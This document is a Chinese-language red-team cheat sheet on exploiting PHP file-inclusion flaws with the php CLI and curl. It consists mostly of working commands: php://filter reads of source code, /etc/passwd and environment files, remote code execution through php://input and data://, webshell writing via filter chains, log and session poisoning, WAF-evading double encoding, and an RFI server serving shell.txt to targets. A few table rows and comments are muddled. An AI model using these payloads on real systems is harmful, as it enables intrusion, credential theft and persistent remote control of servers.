## 目录

- [[#一、php CLI 基础|一、php CLI 基础]]
- [[#二、php -r 一行流|二、php -r 一行流]]
- [[#三、内置 Web 服务器|三、内置 Web 服务器]]
- [[#四、curl 与 php封装器|四、curl 与 php封装器]]
- [[#五、phpfilter 读源码实战|五、php://filter 读源码实战]]
- [[#六、phpinput 与 data 打码|六、php://input 与 data:// 打码]]
- [[#七、日志与会话文件包含|七、日志与会话文件包含]]
- [[#八、编码与混淆传输|八、编码与混淆传输]]
- [[#九、红队视角总结|九、红队视角总结]]

---

## 一、php CLI 基础

### 安装与验证

| 系统 | 安装 |
|------|------|
| Debian/Ubuntu | `sudo apt install php-cli php-curl` |
| Arch | `sudo pacman -S php` |
| macOS | `brew install php` |
| Windows | php.exe 加入 PATH（官网 zip 包） |

```bash
php -v        # 版本
php -m        # 已加载模块列表（看有没有 curl/fileinfo 等）
php -i        # phpinfo 全量输出
php -i | grep -i "disable_functions"   # 看禁用函数
php -i | grep -i "allow_url_include"   # 看 RFI 开关
```

> 终端渗透时的关键动作：本地起一个与目标同版本 PHP 环境，把目标源码拉下来本地复现。

### 常用 CLI 参数

| 参数 | 作用 |
|------|------|
| `php -r 'code'` | 直接执行代码，不写文件 |
| `php -a` | 交互式 REPL |
| `php -S host:port` | 内置 Web 服务器 |
| `php -f file.php` | 执行文件 |
| `php -n` | 不加载 php.ini（绕过自定义配置） |
| `php -m` | 列出模块 |
| `php -i` | phpinfo 输出 |
| `php -l file.php` | 语法检查（lint） |
| `php -d key=val` | 运行时设置 ini 项 |

```bash
# 语法检查批量找畸形文件
php -l shell.php
# 自定义 ini 启动
php -d allow_url_include=1 -r 'include("http://x/y");'
```

---

## 二、php -r 一行流

终端直接跑 PHP，无需编辑器——与 Python 的 `python -c` 同理。

```bash
# 基本
php -r 'echo 1+1;'
php -r 'print_r($_GET);'
php -r 'var_dump(md5("QNKCDZO"));'
```

### 本地复现漏洞

```bash
# 复现 0e 碰撞
php -r 'var_dump(md5("QNKCDZO") == md5("s878926199a"));'   # bool(true)

# 复现弱类型
php -r 'var_dump("1abc" == 1);'    # bool(true) PHP<8

# 测试函数是否被禁用
php -r 'echo function_exists("system") ? "yes" : "no";'
```

### 读取/解码

```bash
# Base64 解码（配合 php://filter 读源码）
php -r 'echo base64_decode("PD9waHAgcGhwaW5mbygpOz8+");'

# 生成 URL 编码 payload
php -r 'echo urlencode("<?php system(\$_GET[\"c\"]);?>");'
```

### 与 curl 组合（pipeline）

```bash
# 一行流：拉源码 → 解码 → 存本地
curl -s "http://target/index.php?file=php://filter/convert.base64-encode/resource=config" | php -r 'echo base64_decode(file_get_contents("php://stdin"));' > config_local.php
```

---

## 三、内置 Web 服务器

### 起一个本地测试站

```bash
# 当前目录起服务（默认路由到 index.php）
php -S 127.0.0.1:8080

# 指定路由文件（任何请求都走 router.php）
php -S 127.0.0.1:8080 router.php

# 指定文档根目录
php -S 127.0.0.1:8080 -t /var/www/html
```

### 测试用例

```bash
# 本地验证 LFI 姿势
php -S 127.0.0.1:8080
# 然后:
curl "http://127.0.0.1:8080/index.php?file=php://filter/convert.base64-encode/resource=index"
```

> 内置服务器默认只处理 index.php 等少数静态文件路由，适合本地复现，不适合生产。

### 与攻击脚本的配合

```bash
# 起一个 PHP 攻击服务器，回传 RFI 载荷
php -S 0.0.0.0:8888 -t /tmp/payloads
# 目标: include("http://your-ip:8888/shell.txt")
```

---

## 四、curl 与 php封装器

### 核心姿势（用户提问场景）

用户要求的 `curl "URL?file=//php=xxxxxxx"` 本质是：**在终端用 curl 向目标的文件包含点传入 php 封装器**。语法为 URL 编码或直接传：

```bash
# php://filter 读源码（目标含 include($_GET['file'])）
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=config"
# 返回 Base64 → 本地解码
curl -s "http://target/index.php?file=php://filter/convert.base64-encode/resource=config" | base64 -d
```

### 封装器一览

| 封装器 | 用途 | 前提 |
|--------|------|------|
| `php://filter` | 读源码（Base64 编码输出） | 文件包含点 |
| `php://input` | POST body 当文件内容 | `allow_url_include=On` |
| `data://` | 数据流当文件内容 | `allow_url_include=On` |
| `expect://` | 直接执行命令 | `expect` 扩展（少见） |
| `file://` | 读本地文件 | 默认开启 |
| `phar://` | 反序列化（见 07 章） | 有可控 phar 文件 |
| `zip://` | zip 内文件 | |
| `http://` | RFI 远程包含 | `allow_url_include=On` |

### 参数速记

```text
php://filter/read=convert.base64-encode/resource=目标文件
```

| 参数 | 作用 |
|------|------|
| `read=convert.base64-encode` | Base64 编码后输出，绕过 PHP 解析直接看源码 |
| `convert.base64-decode` | 解码（配合写马场景） |
| `string.rot13` | ROT13 编码（绕过部分过滤器） |
| `resource=xxx` | 目标文件（相对包含点路径） |
| 链式 | `read=convert.base64-encode|convert.base64-decode` 可组合 |

---

## 五、php://filter 读源码实战

### 场景：index.php 的 include

```php
<?php
// 目标源码（未知，需要读）
$file = $_GET['file'];
include($file . ".php");
?>
```

### 读自身

```bash
# 注意：源码在 < ?php 标签内，直接包含会执行，必须 Base64 编码读
curl -s "http://target/index.php?file=php://filter/convert.base64-encode/resource=index"
# 输出: PD9waHAKJGZpbGUgPSAkX0dFVFs... （Base64）
curl -s "http://target/index.php?file=php://filter/convert.base64-encode/resource=index" | base64 -d
```

### 读配置文件

```bash
# 读 config.php / 数据库配置
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=config"
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=../config"
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=../../../etc/passwd"
```

### 绕过追加后缀 .php

目标代码 `include($file . ".php")` 时：

| 手法 | 载荷 |
|------|------|
| `%00` 截断（PHP < 5.3.4） | `resource=../../etc/passwd%00` |
| filter 不受后缀影响 | `resource=php://filter/.../resource=../../etc/passwd` 仍拼 .php？→ 用 filter 链解决 |
| 相对路径 | `resource=./config` 使 `.php` 落在正确位置 |

```bash
# 追加后缀场景的通用解法：包含点本身吃 filter
curl "http://target/index.php?file=php://filter/convert.base64-encode/resource=config"
# 最终 include("php://filter/.../resource=config" . ".php")
# 结果仍为 filter 流 → .php 后缀被忽略 → 成功读取
```

### 读其他常见文件

```bash
# 系统文件
?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=../../../../etc/php.ini
?file=php://filter/convert.base64-encode/resource=../../../../proc/self/environ
```

---

## 六、php://input 与 data:// 打码

### php://input：POST body 当代码

```bash
# 前提：allow_url_include=On
curl -s "http://target/index.php?file=php://input" \
  -d '<?php system($_GET["c"]); ?>' \
  --get --data-urlencode "c=id"
```

更常见的组合（body 直接放命令）：

```bash
# 一次性完成：POST 打码 + 带命令
curl -s -X POST "http://target/index.php?file=php://input&c=id" \
  --data '<?php system($_GET["c"]);?>'
```

```bash
# 读 /etc/passwd（body 放读文件代码）
curl -s -X POST "http://target/index.php?file=php://input" \
  --data '<?php echo file_get_contents("/etc/passwd");?>'
```

### data://：URL 内嵌代码

```bash
# data://text/plain,<php代码>
curl -s "http://target/index.php?file=data://text/plain,<?php system('id');?>"
```

URL 编码版本（shell 特殊字符安全）：

```bash
# php code 先 urlencode
curl -s "http://target/index.php?file=data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%3F%3E"
# 等价: data://text/plain,<?php system('id');?>
```

```bash
# 用 php -r 生成编码 payload
php -r 'echo urlencode("<?php system(\$_GET[\"c\"]);?>");'
# %3C%3Fphp%20system%28%24_GET%5B%22c%22%5D%29%3B%3F%3E
```

### 写马到目标（filter 链）

```bash
# 场景：能读不能执行？部分站点可用 filter 链写文件（需可写目录）
curl -s "http://target/index.php?file=php://filter/write=convert.base64-decode/resource=/var/www/html/shell.php" \
  --data-binary "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
# 原理：将 Base64 解码后写入目标文件
```

---

## 七、日志与会话文件包含

### Apache/Nginx 日志投毒

```bash
# 1. 往 User-Agent 里写 PHP 代码（日志会记录）
curl -s -A "<?php system(\$_GET['c']);?>" "http://target/index.php"

# 2. 包含日志文件（路径因系统而异）
curl -s "http://target/index.php?file=../../../../var/log/apache2/access.log&c=id"
curl -s "http://target/index.php?file=../../../../var/log/nginx/access.log&c=id"
```

| 日志路径 | 系统 |
|----------|------|
| `/var/log/apache2/access.log` | Debian/Ubuntu Apache |
| `/var/log/httpd/access_log` | CentOS/RHEL Apache |
| `/var/log/nginx/access.log` | Nginx |
| `/var/log/apache2/error.log` | 错误日志（含 PHP 报错与 UA） |

> 日志投毒要点：UA 中的 `<?php ... ?>` 会被日志原样记录；包含后 PHP 解析执行。WAF 拦 UA 时可用 `<?=` 短标签、编码绕过。

### Session 文件包含

```bash
# 1. 往 Session 里写内容（登录表单/任意可控值写入 $_SESSION）
# 2. 包含 session 文件（文件名 = sess_ + PHPSESSID）
curl -s -b "PHPSESSID=evil123" "http://target/index.php?file=/var/lib/php/sessions/sess_evil123"
```

```php
<?php
// 目标代码里如果 session 值可控：
session_start();
$_SESSION['user'] = $_GET['u'];
include($_GET['file']);
?>
```

```text
# session 文件内容:
# user|s:16:"<?php system($_GET['c']);?>";
# 包含后 → 执行
```

### /proc/self/environ 包含

```bash
curl -s "http://target/index.php?file=../../../../proc/self/environ"
# 环境变量含 User-Agent 等 → 先污染 UA 再包含
curl -s -A "<?php system('id');?>" "http://target/index.php?file=../../../../proc/self/environ"
```

---

## 八、编码与混淆传输

### URL 编码

| 字符 | 编码 | 场景 |
|------|------|------|
| `?` | `%3f` | 嵌套参数 |
| `#` | `%23` | 截断 |
| 空格 | `%20` 或 `+` | |
| `&` | `%26` | 参数分隔冲突 |
| `=` | `%3d` | 值内等号 |
| `<` `>` | `%3c` `%3e` | 打码时避免被 URL 解析 |
| `;` | `%3b` | 命令注入 |
| 换行 | `%0a` | 日志/命令注入 |

### 双层编码

```bash
# WAF 只解码一层时
curl -s "http://target/index.php?file=php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dconfig"
# 服务端 urldecode 两次 → php://filter/... 生效
```

### Base64 变体

```bash
# filter 链：先 base64-decode 再 base64-encode（绕过对关键字的过滤）
?file=php://filter/read=convert.base64-encode/resource=config
?file=php://filter/read=string.rot13/resource=config
```

---

## 九、红队视角总结

| 动作 | 终端命令 |
|------|---------|
| 本地复现环境 | `php -r` / `php -S 127.0.0.1:8080` |
| 读目标源码 | `curl "URL?file=php://filter/convert.base64-encode/resource=xxx" \| base64 -d` |
| POST 打码 | `curl -X POST "URL?file=php://input&c=id" --data '<?php system($_GET["c"]);?>'` |
| data 打码 | `curl "URL?file=data://text/plain,<?php system('id');?>"` |
| 日志投毒 | `curl -A '<?php system($_GET[c]);?>' URL` 后包含日志 |
| 会话包含 | 伪造 PHPSESSID → 写 session → 包含 sess_文件 |
| 写马 | `php://filter/write=convert.base64-decode/resource=shell.php` |
| 编码 | urlencode / base64 / rot13 / 双层编码 |
| 查询开关 | `php -i \| grep allow_url_include`（本地对版本） |

**判断流程**：
1. 发现 `?file=` 类参数 → 先试 `php://filter/convert.base64-encode/resource=index` 读源码
2. 源码到手 → 看 `allow_url_include`（本地 `php -i` 同版本验证行为）
3. 能读不能执行 → 日志/会话/`/proc/self/environ` 投毒
4. 能执行 → 上 WebShell（见 06 章）或直接打命令

---

**返回** [[PHP基础总目录|PHP 总目录]] | [[../前端基础总目录|前端基础总目录]]